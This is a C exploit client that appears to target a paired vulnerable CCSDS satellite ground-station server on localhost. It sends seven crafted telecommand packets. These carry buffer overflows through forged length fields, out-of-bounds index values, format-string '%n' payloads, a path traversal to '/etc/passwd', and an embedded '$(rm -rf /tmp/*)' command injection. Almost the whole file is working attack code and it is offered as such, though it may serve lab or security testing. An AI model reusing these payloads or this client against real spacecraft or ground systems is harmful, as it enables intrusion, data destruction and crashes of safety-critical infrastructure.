#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdint.h>

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 2023
#define MAX_PAYLOAD_SIZE 8192

// CCSDS Protocol Headers (matching server)
typedef struct __attribute__((packed)) {
    uint16_t packet_version_number : 3;
    uint16_t packet_type : 1;
    uint16_t sec_header_flag : 1;
    uint16_t apid : 11;
    uint16_t sequence_flags : 2;
    uint16_t packet_sequence_count : 14;
    uint16_t packet_data_length;
} ccsds_primary_header_t;

typedef struct __attribute__((packed)) {
    uint8_t  version_number : 4;
    uint8_t  bypass_flag : 1;
    uint8_t  control_command_flag : 1;
    uint8_t  spare : 2;
    uint8_t  spacecraft_id;
    uint8_t  virtual_channel_id : 6;
    uint8_t  reserved : 2;
    uint8_t  map_id;
} tc_secondary_header_t;

// Command structures (matching server)
typedef struct __attribute__((packed)) {
    uint8_t command_type;
    uint8_t target_mode;
    float target_quaternion[4];
    float angular_velocity[3];
    uint16_t control_duration;
    uint8_t thruster_config;
} attitude_control_cmd_t;

typedef struct __attribute__((packed)) {
    uint8_t command_type;
    uint8_t maneuver_type;
    float delta_v[3];
    uint32_t burn_start_time;
    uint16_t burn_duration;
    uint8_t engine_selection;
} orbit_maneuver_cmd_t;

typedef struct __attribute__((packed)) {
    uint8_t command_type;
    uint8_t payload_id;
    uint8_t operation_mode;
    uint32_t data_rate;
    uint16_t integration_time;
    uint8_t filter_config[8];
    char target_coordinates[32];
} payload_control_cmd_t;

typedef struct __attribute__((packed)) {
    uint8_t command_type;
    uint8_t data_type;
    uint32_t start_time;
    uint32_t end_time;
    uint16_t max_packets;
    uint8_t priority;
    char file_pattern[64];
} data_download_cmd_t;

// Create CCSDS packet header
void create_ccsds_header(ccsds_primary_header_t* primary, tc_secondary_header_t* secondary, 
                        uint8_t sat_id, uint16_t data_length) {
    // Primary header
    primary->packet_version_number = 0;
    primary->packet_type = 1;          // Telecommand
    primary->sec_header_flag = 1;      // Secondary header present
    primary->apid = 0x7FF;             // All stations
    primary->sequence_flags = 3;       // Standalone packet
    primary->packet_sequence_count = rand() & 0x3FFF;
    primary->packet_data_length = data_length - 1;
    
    // Secondary header
    secondary->version_number = 0;
    secondary->bypass_flag = 0;
    secondary->control_command_flag = 1;
    secondary->spare = 0;
    secondary->spacecraft_id = sat_id;
    secondary->virtual_channel_id = 0;
    secondary->reserved = 0;
    secondary->map_id = 0;
}

// EXPLOIT 1: Attitude Control Buffer Overflow
void exploit_attitude_control_overflow(int sock, uint8_t sat_id) {
    uint8_t packet[MAX_PAYLOAD_SIZE];
    ccsds_primary_header_t* primary = (ccsds_primary_header_t*)packet;
    tc_secondary_header_t* secondary = (tc_secondary_header_t*)(packet + sizeof(ccsds_primary_header_t));
    
    printf("[EXPLOIT] Attitude Control Buffer Overflow - Satellite %d\n", sat_id);
    
    // Create malicious attitude control command
    attitude_control_cmd_t* cmd = (attitude_control_cmd_t*)(packet + sizeof(ccsds_primary_header_t) + sizeof(tc_secondary_header_t));
    
    cmd->command_type = 0x10;          // CMD_ATTITUDE_CONTROL
    cmd->target_mode = 1;              // POINT mode
    cmd->target_quaternion[0] = 1.0;
    cmd->target_quaternion[1] = 0.0;
    cmd->target_quaternion[2] = 0.0;
    cmd->target_quaternion[3] = 0.0;
    cmd->angular_velocity[0] = 0.01;
    cmd->angular_velocity[1] = 0.01;
    cmd->angular_velocity[2] = 0.01;
    cmd->control_duration = 300;
    cmd->thruster_config = 255;        // VULNERABILITY: Out-of-bounds array access (should be 0-7)
    
    // Fill remaining packet with overflow data
    uint8_t* overflow_data = (uint8_t*)cmd + sizeof(attitude_control_cmd_t);
    memset(overflow_data, 'A', 1024);  // Large overflow pattern
    strcpy((char*)overflow_data + 500, "EXPLOIT_ATTITUDE_SHELLCODE");
    
    // VULNERABILITY: Malicious packet_data_length to cause buffer overflow
    uint16_t malicious_length = sizeof(tc_secondary_header_t) + sizeof(attitude_control_cmd_t) + 1024;
    
    create_ccsds_header(primary, secondary, sat_id, malicious_length);
    
    // Send malicious packet
    uint16_t total_packet_size = sizeof(ccsds_primary_header_t) + malicious_length;
    send(sock, packet, total_packet_size, 0);
    
    printf("[EXPLOIT] Sent oversized attitude control packet (%d bytes)\n", total_packet_size);
}

// EXPLOIT 2: Orbit Maneuver sprintf Buffer Overflow
void exploit_orbit_maneuver_overflow(int sock, uint8_t sat_id) {
    uint8_t packet[MAX_PAYLOAD_SIZE];
    ccsds_primary_header_t* primary = (ccsds_primary_header_t*)packet;
    tc_secondary_header_t* secondary = (tc_secondary_header_t*)(packet + sizeof(ccsds_primary_header_t));
    
    printf("[EXPLOIT] Orbit Maneuver sprintf Overflow - Satellite %d\n", sat_id);
    
    // First, we need to corrupt the satellite name in the server's memory
    // This requires multiple packets to set up the attack
    
    orbit_maneuver_cmd_t* cmd = (orbit_maneuver_cmd_t*)(packet + sizeof(ccsds_primary_header_t) + sizeof(tc_secondary_header_t));
    
    cmd->command_type = 0x20;          // CMD_ORBIT_MANEUVER
    cmd->maneuver_type = 1;            // RETROGRADE
    cmd->delta_v[0] = 10.0;            // Large delta-V values
    cmd->delta_v[1] = 15.0;
    cmd->delta_v[2] = 5.0;
    cmd->burn_start_time = 1000;
    cmd->burn_duration = 99999;        // Large burn duration for sprintf
    cmd->engine_selection = 100;       // VULNERABILITY: Out-of-bounds array access (should be 0-3)
    
    // Fill with overflow data targeting trajectory_buffer
    uint8_t* overflow_data = (uint8_t*)cmd + sizeof(orbit_maneuver_cmd_t);
    memset(overflow_data, 'B', 512);
    strcpy((char*)overflow_data + 200, "EXPLOIT_ORBIT_PAYLOAD");
    
    // VULNERABILITY: Malicious packet_data_length for memcpy overflow
    uint16_t malicious_length = sizeof(tc_secondary_header_t) + sizeof(orbit_maneuver_cmd_t) + 512;
    
    create_ccsds_header(primary, secondary, sat_id, malicious_length);
    
    uint16_t total_packet_size = sizeof(ccsds_primary_header_t) + malicious_length;
    send(sock, packet, total_packet_size, 0);
    
    printf("[EXPLOIT] Sent orbit maneuver overflow packet (%d bytes)\n", total_packet_size);
}

// EXPLOIT 3: Payload Control Multiple Buffer Overflows
void exploit_payload_control_overflow(int sock, uint8_t sat_id) {
    uint8_t packet[MAX_PAYLOAD_SIZE];
    ccsds_primary_header_t* primary = (ccsds_primary_header_t*)packet;
    tc_secondary_header_t* secondary = (tc_secondary_header_t*)(packet + sizeof(ccsds_primary_header_t));
    
    printf("[EXPLOIT] Payload Control Multiple Overflows - Satellite %d\n", sat_id);
    
    payload_control_cmd_t* cmd = (payload_control_cmd_t*)(packet + sizeof(ccsds_primary_header_t) + sizeof(tc_secondary_header_t));
    
    cmd->command_type = 0x30;          // CMD_PAYLOAD_CONTROL
    cmd->payload_id = 255;             // VULNERABILITY: Out-of-bounds array access (should be 0-3)
    cmd->operation_mode = 1;
    cmd->data_rate = 1000000;
    cmd->integration_time = 1000;
    
    // Fill filter_config with overflow pattern
    memset(cmd->filter_config, 'C', 8);
    
    // VULNERABILITY: Oversized target_coordinates to overflow coordinate_buffer
    char malicious_coords[200];
    memset(malicious_coords, 'D', sizeof(malicious_coords));
    strcpy(malicious_coords + 100, "EXPLOIT_PAYLOAD_COORDS");
    malicious_coords[sizeof(malicious_coords) - 1] = '\0';
    
    // This will overflow the target_coordinates field
    memcpy(cmd->target_coordinates, malicious_coords, sizeof(malicious_coords));
    
    // Add additional overflow data after the structure
    uint8_t* overflow_data = (uint8_t*)cmd + sizeof(payload_control_cmd_t);
    memset(overflow_data, 'E', 300);
    strcpy((char*)overflow_data + 150, "EXPLOIT_FILTER_OVERFLOW");
    
    // VULNERABILITY: Malicious packet_data_length for filter overflow
    uint16_t malicious_length = sizeof(tc_secondary_header_t) + sizeof(payload_control_cmd_t) + 300;
    
    create_ccsds_header(primary, secondary, sat_id, malicious_length);
    
    uint16_t total_packet_size = sizeof(ccsds_primary_header_t) + malicious_length;
    send(sock, packet, total_packet_size, 0);
    
    printf("[EXPLOIT] Sent payload control overflow packet (%d bytes)\n", total_packet_size);
}

// EXPLOIT 4: Data Download Multiple sprintf Overflows
void exploit_data_download_overflow(int sock, uint8_t sat_id) {
    uint8_t packet[MAX_PAYLOAD_SIZE];
    ccsds_primary_header_t* primary = (ccsds_primary_header_t*)packet;
    tc_secondary_header_t* secondary = (tc_secondary_header_t*)(packet + sizeof(ccsds_primary_header_t));
    
    printf("[EXPLOIT] Data Download sprintf Overflows - Satellite %d\n", sat_id);
    
    data_download_cmd_t* cmd = (data_download_cmd_t*)(packet + sizeof(ccsds_primary_header_t) + sizeof(tc_secondary_header_t));
    
    cmd->command_type = 0x50;          // CMD_DATA_DOWNLOAD
    cmd->data_type = 1;                // PAYLOAD data
    cmd->start_time = 1000;
    cmd->end_time = 2000;
    cmd->max_packets = 1000;
    cmd->priority = 255;               // High priority
    
    // VULNERABILITY: Oversized file_pattern to overflow file_list and download_queue buffers
    char malicious_pattern[400];
    memset(malicious_pattern, 'F', sizeof(malicious_pattern));
    
    // Embed format string exploits and shell commands
    strcpy(malicious_pattern + 100, "*.dat%n%n%n%n/bin/sh");
    strcpy(malicious_pattern + 200, "EXPLOIT_DOWNLOAD_PATTERN");
    strcpy(malicious_pattern + 300, "$(rm -rf /tmp/*)");
    malicious_pattern[sizeof(malicious_pattern) - 1] = '\0';
    
    // This will overflow the file_pattern field
    memcpy(cmd->file_pattern, malicious_pattern, sizeof(malicious_pattern));
    
    uint16_t malicious_length = sizeof(tc_secondary_header_t) + sizeof(data_download_cmd_t) + 200;
    
    create_ccsds_header(primary, secondary, sat_id, malicious_length);
    
    uint16_t total_packet_size = sizeof(ccsds_primary_header_t) + malicious_length;
    send(sock, packet, total_packet_size, 0);
    
    printf("[EXPLOIT] Sent data download overflow packet (%d bytes)\n", total_packet_size);
}

// EXPLOIT 5: Emergency Command with Packet Crafting
void exploit_emergency_command_crafting(int sock, uint8_t sat_id) {
    uint8_t packet[MAX_PAYLOAD_SIZE];
    ccsds_primary_header_t* primary = (ccsds_primary_header_t*)packet;
    tc_secondary_header_t* secondary = (tc_secondary_header_t*)(packet + sizeof(ccsds_primary_header_t));
    
    printf("[EXPLOIT] Emergency Command Packet Crafting - Satellite %d\n", sat_id);
    
    // Create a malformed emergency command
    uint8_t* cmd_data = packet + sizeof(ccsds_primary_header_t) + sizeof(tc_secondary_header_t);
    
    cmd_data[0] = 0xFF;                // CMD_EMERGENCY_SAFE
    
    // Fill the rest with crafted data to trigger vulnerabilities in other handlers
    memset(cmd_data + 1, 'G', 1000);
    
    // Embed multiple exploit payloads
    strcpy((char*)cmd_data + 100, "EMERGENCY_EXPLOIT_MARKER");
    strcpy((char*)cmd_data + 200, "%n%n%n%n%s%s%s%s");  // Format string exploit
    strcpy((char*)cmd_data + 300, "../../../../etc/passwd");  // Path traversal
    
    // Malicious packet length
    uint16_t malicious_length = sizeof(tc_secondary_header_t) + 1000;
    
    create_ccsds_header(primary, secondary, sat_id, malicious_length);
    
    uint16_t total_packet_size = sizeof(ccsds_primary_header_t) + malicious_length;
    send(sock, packet, total_packet_size, 0);
    
    printf("[EXPLOIT] Sent emergency command exploit packet (%d bytes)\n", total_packet_size);
}

// EXPLOIT 6: Invalid Satellite ID Buffer Overflow
void exploit_invalid_satellite_id(int sock) {
    uint8_t packet[MAX_PAYLOAD_SIZE];
    ccsds_primary_header_t* primary = (ccsds_primary_header_t*)packet;
    tc_secondary_header_t* secondary = (tc_secondary_header_t*)(packet + sizeof(ccsds_primary_header_t));
    
    printf("[EXPLOIT] Invalid Satellite ID Attack\n");
    
    // Use invalid satellite ID to potentially bypass bounds checks
    uint8_t invalid_sat_id = 255;      // Much larger than MAX_SATELLITES (16)
    
    attitude_control_cmd_t* cmd = (attitude_control_cmd_t*)(packet + sizeof(ccsds_primary_header_t) + sizeof(tc_secondary_header_t));
    
    cmd->command_type = 0x10;          // CMD_ATTITUDE_CONTROL
    cmd->target_mode = 1;
    cmd->target_quaternion[0] = 1.0;
    cmd->target_quaternion[1] = 0.0;
    cmd->target_quaternion[2] = 0.0;
    cmd->target_quaternion[3] = 0.0;
    cmd->angular_velocity[0] = 0.01;
    cmd->angular_velocity[1] = 0.01;
    cmd->angular_velocity[2] = 0.01;
    cmd->control_duration = 300;
    cmd->thruster_config = 0;
    
    // Fill with overflow data
    uint8_t* overflow_data = (uint8_t*)cmd + sizeof(attitude_control_cmd_t);
    memset(overflow_data, 'H', 800);
    strcpy((char*)overflow_data + 400, "INVALID_SATID_EXPLOIT");
    
    uint16_t malicious_length = sizeof(tc_secondary_header_t) + sizeof(attitude_control_cmd_t) + 800;
    
    create_ccsds_header(primary, secondary, invalid_sat_id, malicious_length);
    
    uint16_t total_packet_size = sizeof(ccsds_primary_header_t) + malicious_length;
    send(sock, packet, total_packet_size, 0);
    
    printf("[EXPLOIT] Sent invalid satellite ID packet (ID=%d, %d bytes)\n", invalid_sat_id, total_packet_size);
}

// EXPLOIT 7: Malformed CCSDS Header Attack
void exploit_malformed_ccsds_header(int sock) {
    uint8_t packet[MAX_PAYLOAD_SIZE];
    ccsds_primary_header_t* primary = (ccsds_primary_header_t*)packet;
    tc_secondary_header_t* secondary = (tc_secondary_header_t*)(packet + sizeof(ccsds_primary_header_t));
    
    printf("[EXPLOIT] Malformed CCSDS Header Attack\n");
    
    // Create malformed CCSDS header
    primary->packet_version_number = 7;  // Invalid version
    primary->packet_type = 1;
    primary->sec_header_flag = 1;
    primary->apid = 0x7FF;
    primary->sequence_flags = 3;
    primary->packet_sequence_count = 0xFFFF;
    primary->packet_data_length = 0xFFFF;  // Maximum length - will cause huge allocation
    
    // Malformed secondary header
    secondary->version_number = 15;      // Invalid version
    secondary->bypass_flag = 1;
    secondary->control_command_flag = 1;
    secondary->spare = 3;
    secondary->spacecraft_id = 0;        // Valid satellite ID
    secondary->virtual_channel_id = 63;  // Maximum value
    secondary->reserved = 3;
    secondary->map_id = 255;
    
    // Fill payload with exploit data
    uint8_t* payload = packet + sizeof(ccsds_primary_header_t) + sizeof(tc_secondary_header_t);
    memset(payload, 'I', 2000);
    strcpy((char*)payload + 1000, "MALFORMED_CCSDS_EXPLOIT");
    
    // Send the malformed packet
    uint16_t total_packet_size = sizeof(ccsds_primary_header_t) + sizeof(tc_secondary_header_t) + 2000;
    send(sock, packet, total_packet_size, 0);
    
    printf("[EXPLOIT] Sent malformed CCSDS header packet (%d bytes)\n", total_packet_size);
}

// Execute all exploits in sequence
void execute_exploit_sequence(int sock) {
    printf("\n=== SATELLITE COMMUNICATION EXPLOIT SEQUENCE ===\n");
    
    // Target different satellites with different exploits
    exploit_attitude_control_overflow(sock, 0);
    usleep(500000);  // 0.5 second delay
    
    exploit_orbit_maneuver_overflow(sock, 1);
    usleep(500000);
    
    exploit_payload_control_overflow(sock, 2);
    usleep(500000);
    
    exploit_data_download_overflow(sock, 3);
    usleep(500000);
    
    exploit_emergency_command_crafting(sock, 4);
    usleep(500000);
    
    exploit_invalid_satellite_id(sock);
    usleep(500000);
    
    exploit_malformed_ccsds_header(sock);
    usleep(500000);
    
    printf("\n=== EXPLOIT SEQUENCE COMPLETED ===\n");
}

int main() {
    int sock;
    struct sockaddr_in server_addr;
    char response[256];
    
    printf("=== SATELLITE COMMUNICATION EXPLOIT CLIENT ===\n");
    printf("Target: %s:%d\n", SERVER_IP, SERVER_PORT);
    printf("Protocol: CCSDS Telecommand\n");
    printf("Vulnerabilities: CWE-787 (Out-of-bounds Write)\n\n");
    
    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        exit(1);
    }
    
    // Configure server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr);
    
    // Connect to ground station
    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection to ground station failed");
        exit(1);
    }
    
    printf("[INFO] Connected to satellite ground station\n");
    
    // Execute exploit sequence
    execute_exploit_sequence(sock);
    
    // Try to receive responses (may fail due to crashes)
    printf("\n=== ATTEMPTING TO RECEIVE RESPONSES ===\n");
    
    for (int i = 0; i < 7; i++) {
        ssize_t bytes = recv(sock, response, sizeof(response) - 1, MSG_DONTWAIT);
        if (bytes > 0) {
            response[bytes] = '\0';
            printf("[RESPONSE %d] %s\n", i + 1, response);
        } else {
            printf("[RESPONSE %d] No response (possible crash)\n", i + 1);
        }
    }
    
    close(sock);
    printf("\n[INFO] Exploit client terminated\n");
    
    return 0;
}